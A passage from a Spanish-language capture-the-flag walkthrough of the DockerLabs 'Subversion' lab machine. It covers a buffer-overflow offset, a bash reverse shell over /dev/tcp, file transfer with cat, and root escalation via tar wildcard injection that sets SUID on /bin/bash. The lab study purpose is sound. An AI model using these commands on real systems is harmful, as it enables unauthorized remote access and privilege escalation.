Respuesta: luchacontraelapartheid
Pregunta extra: Adivina el número secreto para continuar (entre 0 y 9999999):
Respuesta: 79823
¡Felicitaciones! Has adivinado el número secreto.
Introduce tu "mágico" texto para continuar:
```

Bien justo después de "continuar:" necesitamos introducir nuestro payload copiado ahí.

Y podemos ver esto:

![Screenshot](/hard/Subversion/Images/image4.png)

Sobrescribimos el registro de RBP (base stack pointer), este registro está justo antes de RIP (Instruction Pointer)

Para encontrar el offset de RIP necesitamos usar el siguiente comando:

```r
gef➤  pattern offset $rsp
[+] Searching for '6a61616161616161'/'616161616161616a' with period=8
[+] Found at offset 72 (little-endian search) likely
```

¿Por qué RSP (Stack Pointer)?

Porque ambos registros (RSP / RIP) están relacionados con datos que sobrescribimos en la pila.

Esta es otra manera de calcular el offset de RIP, todo el proceso que hicimos antes funcionará siempre.

Voy a hacer un diagrama con excalidraw para explicar todo el exploit.

![Screenshot](/hard/Subversion/Images/image5es.png)

Ahora saltemos a la escalada de privilegios.

---
# Escalada de Privilegios

Estamos así:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/exploits]
└─$ python3 exploit.py 
[+] Opening connection to 172.17.0.2 on port 1789: Done
[*] Switching to interactive mode
Has introducido: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb4\x17@
bash: /root/.bashrc: Permission denied
luigi@9a120396fb0d:/$ $ whoami
luigi
luigi@9a120396fb0d:/$ $ id
uid=1000(luigi) gid=0(root) groups=0(root)
luigi@9a120396fb0d:/$ $
```

Estamos usando la terminal de **Pwntools**, personalmente no me gusta, así que voy a hacer una reverse shell, y recibir la shell con **netcat**.

Así que vamos a hacer otra terminal con **netcat** en modo escucha.


```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/exploits]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
```

**-l** <- Este argumento hace que netcat se ponga en modo escucha.

**-v** <- Este argumento activa el modo **verbose**, esto nos mostrará con más detalle la conexión que recibamos.

**-n** <- Esto hace que netcat omita la búsqueda DNS, y solo use directamente la dirección IP.

**-p** <- El puerto en el que estamos escuchando, puede ser cualquiera, si no está siendo usado actualmente.

Bien, ahora ejecutemos el siguiente comando en la terminal de pwntools.

- **bash -i >& /dev/tcp/172.17.0.1/1234 0>&1**

Con este comando básicamente estamos ejecutando un shell interactivo de bash y redirigiendo la salida hacia nosotros, en el puerto 1234.

```r
luigi@9a120396fb0d:/$ $ bash -i >& /dev/tcp/172.17.0.1/1234 0>&1
```

Y recibimos esto en nuestra terminal netcat.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/exploits]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 57630
bash: /root/.bashrc: Permission denied
luigi@9a120396fb0d:/$
```

Bien, ahora vamos a modificar este shell para trabajar mejor con él.

Vamos a salir de la terminal pwntools, porque este proceso es muy incómodo y no queremos usarlo.

Entonces ejecutemos el siguiente comando en nuestro reverse shell.

```r
luigi@9a120396fb0d:/$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
bash: /root/.bashrc: Permission denied
luigi@9a120396fb0d:/$
```

Bien, podemos salir del shell de **pwntools** con CTRL + C.

Y veremos esto:

```r
luigi@9a120396fb0d:/$ bash: [119: 3 (255)] tcsetattr: Input/output error
Hangup
```

No te preocupes, ejecutemos de nuevo el comando script.

```r
luigi@9a120396fb0d:/$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
bash: /root/.bashrc: Permission denied
```

Este comando crea una nueva sesión de bash con **script** y **/dev/null** como archivo de salida, porque script registra cada comando que ejecutamos en un registro, pero con la ruta /dev/null, hacemos que ese registro no pueda grabar comandos, y **-c bash** hace que script ejecute el shell con bash.

Hacemos esto porque queremos usar CTRL + C y más funciones de bash.

Cuando ejecutamos esto, suspendemos nuestro reverse shell por un momento.

Luego ejecutamos el siguiente comando en nuestra máquina de ataque:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/exploits]
└─$ stty raw -echo; fg
```

Este comando hace que stty trate la terminal.

**raw** <- Con raw estamos haciendo que todos los datos de salida y entrada sean sin procesar.

**-echo** <- Con esto hacemos que si ejecutamos un comando no se imprima de nuevo en la salida.

**; fg** <- Y con esto reanudamos nuestro reverse shell de nuevo.

Cuando ejecutamos este comando reiniciamos la xterm:

```r
reset xterm
```

Esto va a reiniciar la terminal.

Si queremos limpiar nuestra terminal no podemos hacerlo porque el término va a ser diferente de xterm, que tiene esta función. Podemos hacerlo de la siguiente manera para poder limpiar nuestra pantalla si se ensucia:

```r
luigi@9a120396fb0d:/$ export TERM=xterm
```

Y una última cosa, ¡si notamos que la visualización de la terminal es muy pequeña!

Podemos ajustar esto para que sea más grande con el siguiente comando:

```r
luigi@9a120396fb0d:/$ stty rows {num} columns {num}
```

¡y finalmente se ve mucho mejor!

Bueno, después de mucho tiempo intentando escalar privilegios, voy a usar **pspy64** para encontrar procesos que se estén ejecutando.

Pero tenemos un problema: no podemos transferir archivos tan fácilmente.

```r
luigi@9a120396fb0d:/$ which nc
luigi@9a120396fb0d:/$ which netcat
luigi@9a120396fb0d:/$ which ncat
luigi@9a120396fb0d:/$ which curl
luigi@9a120396fb0d:/$ which wget
luigi@9a120396fb0d:/$ which scp
```

No tenemos ninguna herramienta para transferir archivos.

Pero aún así, podemos hacerlo.

¿Y cómo?

Podemos usar **cat** para recibir los archivos, y netcat en nuestra máquina como receptor, y enviar de vuelta al emisor el archivo.

¿Cómo podemos hacerlo?

Hagamos un ejemplo:

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/files]
└─$ echo "testing funny hehe :3" > testing.txt
```

Estamos guardando ese contenido en un archivo llamado `testing.txt`.

Ahora, hagamos un receptor de netcat para enviar de vuelta al emisor el archivo.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/files]
└─$ nc -lvnp 1111 < testing.txt 
listening on [any] 1111 ...
```

Bien, ahora usemos `cat` para recibir el archivo.

```r
luigi@9a120396fb0d:/$ cat < /dev/tcp/172.17.0.1/1111
testing funny hehe :3
```

Podemos ver el contenido del archivo, así que podemos usar este método para transferir archivos. Es más inseguro y probable que se corrompa el archivo si la transferencia o la conexión se interrumpen, pero aún así es posible.

Hagamos el mismo proceso para transferir **pspy64**.

```r
┌──(craft㉿kali)-[~/…/dockerlabs/dificil/subversion/files]
└─$ nc -lvnp 1111 < pspy64 
listening on [any] 1111 ...
```

Y ejecutemos `cat` para guardar el contenido en un archivo.

```r
luigi@9a120396fb0d:/tmp$ cat < /dev/tcp/172.17.0.1/1111 > pspy64
```

Bien, ahora, démosle permisos de ejecutable.

```r
luigi@9a120396fb0d:/tmp$ ls   
pspy64  subversion
luigi@9a120396fb0d:/tmp$ chmod +x pspy64
```

Ahora, ejecutémoslo y veamos qué procesos se están ejecutando en la máquina.

```r
luigi@9a120396fb0d:/tmp$ ./pspy64 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2026/02/08 04:03:40 CMD: UID=1000  PID=774    | ./pspy64 
2026/02/08 04:03:40 CMD: UID=1000  PID=191    | bash 
2026/02/08 04:03:40 CMD: UID=1000  PID=190    | sh -c bash 
2026/02/08 04:03:40 CMD: UID=1000  PID=189    | script /dev/null -c bash 
2026/02/08 04:03:40 CMD: UID=1000  PID=119    | bash -i 
2026/02/08 04:03:40 CMD: UID=1000  PID=38     | /bin/bash 
2026/02/08 04:03:40 CMD: UID=1000  PID=37     | sh -c /bin/bash 
2026/02/08 04:03:40 CMD: UID=0     PID=34     | socat TCP-LISTEN:1789,reuseaddr,fork EXEC:/home/luigi/subversion/subversion,pty,raw,echo=0,setsid,ctty,stderr,setuid=luigi 
2026/02/08 04:03:40 CMD: UID=0     PID=33     | tail -f /dev/null 
2026/02/08 04:03:40 CMD: UID=0     PID=32     | /bin/bash /usr/local/bin/start_subversion.sh 
2026/02/08 04:03:40 CMD: UID=0     PID=31     | /usr/sbin/cron 
2026/02/08 04:03:40 CMD: UID=33    PID=25     | nginx: worker process 
2026/02/08 04:03:40 CMD: UID=33    PID=24     | nginx: worker process 
2026/02/08 04:03:40 CMD: UID=33    PID=23     | nginx: worker process 
2026/02/08 04:03:40 CMD: UID=33    PID=22     | nginx: worker process 
2026/02/08 04:03:40 CMD: UID=0     PID=21     | nginx: master process /usr/sbin/nginx 
2026/02/08 04:03:40 CMD: UID=0     PID=8      | svnserve -d -r /svn 
2026/02/08 04:03:40 CMD: UID=0     PID=1      | /bin/bash /entrypoint.sh 
2026/02/08 04:04:01 CMD: UID=0     PID=783    | /usr/sbin/CRON 
2026/02/08 04:04:01 CMD: UID=0     PID=784    | 
2026/02/08 04:04:01 CMD: UID=0     PID=785    | /bin/bash /usr/local/bin/backup.sh 
2026/02/08 04:04:01 CMD: UID=0     PID=786    | mkdir -p /backups 
2026/02/08 04:04:01 CMD: UID=0     PID=787    | tar -czf /backups/home_luigi_backup.tar.gz subversion 
2026/02/08 04:04:01 CMD: UID=0     PID=788    | 
2026/02/08 04:04:01 CMD: UID=0     PID=789    | /bin/sh -c gzip 
```

Y podemos ver que se está ejecutando un trabajo de cron, que ejecuta un script llamado `backup.sh` y crea un directorio `/backups`, y hace un archivo `tar` y lo guarda como `.tar.gz` mientras hace todo esto como root (UID=0).

Veamos el trabajo de cron.

```r
luigi@9a120396fb0d:/tmp$ cat /etc/crontab
# /etc/crontab: crontab global del sistema
# A diferencia de cualquier otro crontab, no necesitas ejecutar el comando `crontab`
# para instalar la nueva versión cuando editas este archivo
# y los archivos en /etc/cron.d. Estos archivos también tienen campos de nombre de usuario,
# que ninguno de los otros crontabs tiene.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Ejemplo de definición de trabajo:
# .---------------- minuto (0 - 59)
# |  .------------- hora (0 - 23)
# |  |  .---------- día del mes (1 - 31)
# |  |  |  .------- mes (1 - 12) o jan,feb,mar,apr...
# |  |  |  |  .---- día de la semana (0 - 6) (domingo=0 o 7) o sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * nombre-de-usuario comando a ejecutar
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root /usr/local/bin/backup.sh
```

Podemos ver que el usuario `root` está ejecutando ese script de bash cada minuto.

Ahora echemos un vistazo al script de bash.

```r
luigi@9a120396fb0d:/tmp$ cat /usr/local/bin/backup.sh
#!/bin/bash
mkdir -p /backups
cd /home/luigi/
tar -czf /backups/home_luigi_backup.tar.gz *
```

Parece legítimo, no vulnerable a nada.

Pero aún así podemos escalar privilegios por este símbolo `*`.

¿Y por qué?

Porque el usuario `root` está moviéndose al directorio de inicio de `luigi`, y tomando todos los archivos y directorios del directorio de inicio de `luigi`, pero esto es malo.

¿Por qué?

Porque con GTFObins podemos ejecutar el siguiente comando:

- **tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh**

¿Y por qué? No podemos ejecutar esto directamente, ¿y cómo pasar esos argumentos?

Porque cualquier directorio y archivo están siendo pasados al comando debido a ese símbolo `*`.

Por ejemplo, si tenemos 3 archivos en el directorio de inicio de `luigi`:

- **very_important.txt**
- **project.txt**
- **funny.txt**

Y el comando es así:

```r
tar -czf /backups/home_luigi_backup.tar.gz very_important.txt project.txt funny.txt
```

Entonces, ¿qué pasa si creamos un archivo como argumento?

Podemos hacerlo con **touch** para crear esos archivos:

```r
luigi@9a120396fb0d:/home/luigi$ touch ./--checkpoint=1
luigi@9a120396fb0d:/home/luigi$ touch ./--checkpoint-action=exec='bash funny.sh'
luigi@9a120396fb0d:/home/luigi$ ls
'--checkpoint=1'  '--checkpoint-action=exec=bash funny.sh'  subversion
```

Así, el comando va a ejecutar un script de bash llamado "funny.sh", pero necesitamos que ese script de bash ejecute algo.

```r
luigi@c67477ef02b3:/home/luigi$ echo -e '#!/bin/bash\nchmod +s /bin/bash' > funny.sh
luigi@c67477ef02b3:/home/luigi$ cat funny.sh 
#!/bin/bash
chmod +s /bin/bash
```

Con este script, el comando va a ejecutar este script de bash y dar permisos de SUID al binario de bash, y así escalar privilegios.

Entonces, el trabajo de cron va a ejecutar `funny.sh`.

Ahora, vamos a observar el binario de bash con `watch`.

```r
luigi@9a120396fb0d:/home/luigi$ watch -n1 -x ls -l /bin/bash
```

Este comando va a ejecutar **ls -l /bin/bash** cada segundo.

![Screenshot](/hard/Subversion/Images/image6.png)

Podemos ver que se le dieron permisos al binario.

Ahora vamos a ejecutar **bash -p** para ejecutar una shell de bash privilegiada.

```c
luigi@c67477ef02b3:/home/luigi$ bash -p
bash-5.0# whoami
root
bash-5.0# id
uid=1000(luigi) gid=0(root) euid=0(root) groups=0(root)
```

Ahora somos root ***...pwned..!***
